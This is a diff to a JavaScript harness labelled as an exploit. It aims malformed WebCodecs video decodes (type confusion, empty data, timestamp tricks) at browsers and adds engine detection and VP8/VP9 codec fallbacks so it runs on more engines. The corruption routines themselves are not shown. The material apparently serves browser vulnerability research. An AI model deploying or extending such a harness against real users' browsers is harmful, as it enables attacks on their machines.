@@ -48,8 +48,6 @@ const log = (msg, type = 'info') => {
 // Exploit Configuration
 // ============================================================================
 const CONFIG = {
-    // Target codec - VP8 is widely supported and has had vulnerabilities
-    codec: "vp8",
     width: 320,
     height: 240,
     
@@ -59,8 +57,25 @@ const CONFIG = {
     // Enable various corruption techniques
     enableTypeConfusion: true,
     enableEmptyData: true,
-    enableTimestampManipulation: true
+    enableTimestampManipulation: true,
+    
+    // Codec candidates in order of preference
+    // Different engines prefer different codec strings
+    codecCandidates: [
+        { codec: "vp8", label: "VP8" },                    // Universal baseline
+        { codec: "vp09.00.10.08", label: "VP9" },         // Chromium preferred
+        { codec: "vp9", label: "VP9 (Gecko)" },           // Gecko preferred
+    ]
 };
+
+// Detect browser engine
+function detectEngine() {
+    const ua = navigator.userAgent.toLowerCase();
+    if (ua.includes('firefox') || ua.includes('gecko')) return 'gecko';
+    if (ua.includes('chrome') || ua.includes('chromium') || ua.includes('edge')) return 'chromium';
+    if (ua.includes('safari') && !ua.includes('chrome')) return 'webkit';
+    return 'unknown';
+}
 
 // ============================================================================
 // Global State
@@ -230,6 +245,16 @@ document.addEventListener("DOMContentLoaded", async () => {
         // Check WebCodecs support
         if (typeof VideoEncoder === 'undefined' || typeof VideoDecoder === 'undefined') {
             log("ERROR: WebCodecs API not supported in this browser", 'error');
+            
+            const engine = detectEngine();
+            if (engine === 'gecko') {
+                log("Firefox: Enable WebCodecs in about:config", 'warn');
+                log("  1. Type about:config in address bar", 'warn');
+                log("  2. Search for dom.media.webcodecs.enabled", 'warn');
+                log("  3. Set to true and restart", 'warn');
+            } else if (engine === 'chromium') {
+                log("Chromium: Check chrome://flags/#enable-webcodecs", 'warn');
+            }
             return;
         }
         
@@ -253,13 +278,54 @@ document.addEventListener("DOMContentLoaded", async () => {
             }
         });
         
-        // Configure encoder
-        log(`Configuring encoder: ${CONFIG.codec} ${CONFIG.width}x${CONFIG.height}`);
-        videoEncoder.configure({
-            codec: CONFIG.codec,
-            width: CONFIG.width,
-            height: CONFIG.height
-        });
+        // Find a working codec
+        let selectedCodec = null;
+        let encoderConfig = null;
+        
+        const engine = detectEngine();
+        log(`Detected engine: ${engine}`);
+        
+        // Reorder candidates based on engine
+        let candidates = [...CONFIG.codecCandidates];
+        if (engine === 'gecko') {
+            // Gecko prefers simpler codec strings
+            candidates.sort((a, b) => {
+                if (a.codec === 'vp9') return -1;
+                if (b.codec === 'vp9') return 1;
+                return 0;
+            });
+        }
+        
+        for (const candidate of candidates) {
+            encoderConfig = {
+                codec: candidate.codec,
+                width: CONFIG.width,
+                height: CONFIG.height,
+                bitrate: 1000000,
+                framerate: 30,
+                latencyMode: 'quality',
+                hardwareAcceleration: 'prefer-software'  // More consistent across engines
+            };
+            
+            try {
+                const support = await VideoEncoder.isConfigSupported(encoderConfig);
+                if (support.supported) {
+                    selectedCodec = candidate;
+                    log(`Using codec: ${candidate.label} (${candidate.codec})`);
+                    break;
+                }
+            } catch (e) {
+                log(`Codec check failed for ${candidate.codec}: ${e.message}`, 'warn');
+            }
+        }
+        
+        if (!selectedCodec) {
+            log("No supported codec found. WebCodecs may not be enabled.", 'error');
+            log("Firefox: set dom.media.webcodecs.enabled=true in about:config", 'warn');
+            return;
+        }
+        
+        videoEncoder.configure(encoderConfig);
         
         // Create a frame from canvas
         const canvas = document.getElementById('c');
@@ -281,7 +347,40 @@ document.addEventListener("DOMContentLoaded", async () => {
         // Configure decoder with captured config
         if (lastVideoDecoderConfig) {
             log("Configuring decoder with captured config...");
-            videoDecoder.configure(lastVideoDecoderConfig);
+            // Ensure codec string is preserved from encoder
+            const decoderConfig = {
+                ...lastVideoDecoderConfig,
+                codec: encoderConfig.codec  // Use the working codec string
+            };
+            videoDecoder.configure(decoderConfig);
+        } else {
+            // Fallback: manually create decoder config if encoder didn't provide one
+            log("No decoder config from encoder, using fallback...");
+            const fallbackConfig = {
+                codec: encoderConfig.codec,
+                codedWidth: CONFIG.width,
+                codedHeight: CONFIG.height
+            };
+            
+            try {
+                const decoderSupport = await VideoDecoder.isConfigSupported(fallbackConfig);
+                if (decoderSupport.supported) {
+                    videoDecoder.configure(fallbackConfig);
+                    log("Decoder configured with fallback config");
+                } else {
+                    log(`Decoder config not supported: ${JSON.stringify(decoderSupport)}`, 'error');
+                    return;
+                }
+            } catch (e) {
+                log(`Decoder config error: ${e.message}`, 'error');
+                return;
+            }
+        }
+        
+        // Check if decoder is configured before running tests
+        if (!videoDecoder.state || videoDecoder.state === "unconfigured") {
+            log("Decoder not configured - skipping decode tests", 'warn');
+            return;
         }
         
         // ============================================================================
@@ -361,9 +460,11 @@ document.addEventListener("DOMContentLoaded", async () => {
         
         // Force decoder flush to process pending decodes
         log("\nFlushing decoder...");
-        await videoDecoder.flush().catch(e => {
+        try {
+            await videoDecoder.flush();
+        } catch (e) {
             log(`Flush error: ${e.message}`, 'error');
-        });
+        }
         
         log("\n=== Analysis Complete ===");
         
